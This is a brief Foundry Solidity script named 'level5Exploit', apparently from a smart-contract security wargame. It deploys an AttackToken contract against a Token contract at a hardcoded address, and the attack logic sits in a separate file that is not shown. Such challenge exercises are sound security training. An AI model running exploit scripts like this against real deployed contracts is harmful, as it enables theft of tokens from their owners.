// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Script} from "forge-std/Script.sol";
import {Token} from "../src/level5/Token.sol";
import {AttackToken} from "../src/level5/AttackToken.sol";
import "forge-std/console.sol";

contract level5Exploit is Script {
    Token token = Token(0x0712131E1171b47D9C1262E97Ba76e4fEf38AB42);

    function run() external {
        vm.startBroadcast();
        new AttackToken(address(token));
        vm.stopBroadcast();
    }
}
